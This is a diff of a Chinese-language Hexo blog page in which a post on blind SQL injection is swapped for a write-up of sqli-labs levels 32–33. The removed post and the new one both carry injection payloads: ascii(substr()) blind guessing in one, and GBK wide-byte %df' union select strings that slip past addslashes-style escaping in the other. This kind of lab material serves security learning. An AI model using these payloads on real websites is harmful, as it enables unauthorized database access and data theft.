@@ -5,19 +5,21 @@
   
 
   
-  <title>盲注 | Hexo</title>
+  <title>sqlilabs 32 33 | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="?id&#x3D;1’ and length(database())&#x3D;n %23 n从0到无穷大 猜出数据库长度  ?id&#x3D;1’ and left(database(),1)&gt;’a‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）  利用substr() ascii()函数进行尝试">
+  <meta name="description" content="32很神奇 输入单双引号 或者加上括号都会出现这么个情况 被加上了个斜杠 被注释掉了 这归功于php的preg_quote函数的功劳  这个需要参数str（输入的字符串）并向其中每个正则表达式的字符前面加个反斜杠  代码长这样 function check_addslashes($string){    $string &#x3D; preg_replace(‘&#x2F;‘. preg_quote(‘\‘) .’&#x2F;">
 <meta property="og:type" content="article">
-<meta property="og:title" content="盲注">
-<meta property="og:url" content="http://example.com/2020/11/25/page-5/index.html">
+<meta property="og:title" content="sqlilabs 32 33">
+<meta property="og:url" content="http://example.com/2021/02/08/page-24/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="?id&#x3D;1’ and length(database())&#x3D;n %23 n从0到无穷大 猜出数据库长度  ?id&#x3D;1’ and left(database(),1)&gt;’a‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）  利用substr() ascii()函数进行尝试">
+<meta property="og:description" content="32很神奇 输入单双引号 或者加上括号都会出现这么个情况 被加上了个斜杠 被注释掉了 这归功于php的preg_quote函数的功劳  这个需要参数str（输入的字符串）并向其中每个正则表达式的字符前面加个反斜杠  代码长这样 function check_addslashes($string){    $string &#x3D; preg_replace(‘&#x2F;‘. preg_quote(‘\‘) .’&#x2F;">
 <meta property="og:locale" content="en_US">
-<meta property="article:published_time" content="2020-11-25T12:28:10.000Z">
-<meta property="article:modified_time" content="2020-11-25T12:28:25.830Z">
+<meta property="og:image" content="https://img2018.cnblogs.com/blog/1675852/201905/1675852-20190531000842735-239639599.png">
+<meta property="article:published_time" content="2021-02-08T05:54:12.000Z">
+<meta property="article:modified_time" content="2021-02-08T08:28:34.301Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://img2018.cnblogs.com/blog/1675852/201905/1675852-20190531000842735-239639599.png">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -66,10 +68,10 @@
   </div>
 </header>
       <div class="outer">
-        <section id="main"><article id="post-page-5" class="article article-type-post" itemscope itemprop="blogPost">
+        <section id="main"><article id="post-page-24" class="article article-type-post" itemscope itemprop="blogPost">
   <div class="article-meta">
-    <a href="/2020/11/25/page-5/" class="article-date">
-  <time datetime="2020-11-25T12:28:10.000Z" itemprop="datePublished">2020-11-25</time>
+    <a href="/2021/02/08/page-24/" class="article-date">
+  <time datetime="2021-02-08T05:54:12.000Z" itemprop="datePublished">2021-02-08</time>
 </a>
     
   </div>
@@ -80,7 +82,7 @@
         
   
     <h1 class="article-title" itemprop="name">
-      盲注
+      sqlilabs 32 33
     </h1>
   
 
@@ -88,17 +90,27 @@
     
     <div class="article-entry" itemprop="articleBody">
       
-        <p>?id=1’ and length(database())=n %23 n从0到无穷大 猜出数据库长度 </p>
-<p>?id=1’ and left(database(),1)&gt;’<strong><em>a</em></strong>‘–+ 猜数据库首字母 显示you are in 表示该字母还在输入的字母后假设输入一个显示you are in的下一个什么都没显示 则为此 第二第三位一次猜下去（猜库名）</p>
-<ul>
-<li>利用substr() ascii()函数进行尝试</li>
-</ul>
-<p>?id=1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit <strong>0</strong>,1),<strong><em>1</em></strong>,1))&gt;<strong>100</strong>–+  加黑数字更改 此为ascii码对照数字对应字母 也是和猜库名一样的操作  这猜第一个库的第一个字符   然后一个一个改 猜出第n个库的第n个字符</p>
+        <p>32很神奇 输入单双引号 或者加上括号都会出现<img src="https://img2018.cnblogs.com/blog/1675852/201905/1675852-20190531000842735-239639599.png" alt="img">这么个情况 被加上了个斜杠 被注释掉了</p>
+<p>这归功于php的preg_quote函数的功劳 </p>
+<p>这个需要参数str（输入的字符串）并向其中每个正则表达式的字符前面加个反斜杠 </p>
+<p>代码长这样</p>
+<p>function check_addslashes($string)<br>{<br>    $string = preg_replace(‘/‘. preg_quote(‘\‘) .’/‘, “\\\“, $string);          //escape any backslash<br>    $string = preg_replace(‘/&#39;/i’, ‘\&#39;‘, $string);                               //escape single quote with a backslash<br>    $string = preg_replace(‘/&quot;/‘, “\&quot;“, $string);                                //escape double quote with a backslash</p>
+<pre><code>return $string;</code></pre>
+<p>}</p>
+<p>字符集编码设置为gbk可使用宽字节注入 </p>
+<p>尝试%df  反斜杠是%5c 那么就会变成一个整体%df5c  mysql认为前两个字符为汉字 （其实浏览器的字符编码不设置也没差就显示一个乱码而已看着有点怪而已） 然后单引号就可以逃脱出来了 </p>
+<p>?id=0%df’ union select 1,2,3 –+ 测显位</p>
+<p>然后?id=0%df’ union select 1,2,database() –+ </p>
+<p>接下去就是那套组合拳 很容易了</p>
+<p>爆表名字那些的时候table_schema=’security’  这个单引号也滤掉了 但是用%df’ 前头的逃出来了 后头那个没有</p>
+<p>那么就再简单些= database（） </p>
+<p>爆列的时候也可直接还是用 table_schema=database()  </p>
+<p>33和32一样只不过换成了addslashes（）函数 用的语句都是一样的</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2020/11/25/page-5/" data-id="ckhxdwgkq0000x0v76f1pa6wz" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/02/08/page-24/" data-id="ckkwc20gm0000iwv70mkm8q5t" class="article-share-link">Share</a>
       
       
     </footer>
@@ -107,19 +119,19 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/01/20/page-8/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/02/08/page-25/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Newer</strong>
       <div class="article-nav-title">
         
-          page less 11-20
+          sqlilabs 34 35
         
       </div>
     </a>
   
   
-    <a href="/2020/11/19/page-4/" id="article-nav-older" class="article-nav-link-wrap">
+    <a href="/2021/02/07/page-23/" id="article-nav-older" class="article-nav-link-wrap">
       <strong class="article-nav-caption">Older</strong>
-      <div class="article-nav-title">sqli-labs</div>
+      <div class="article-nav-title">sqlilabs 29 30 31</div>
     </a>
   
 </nav>
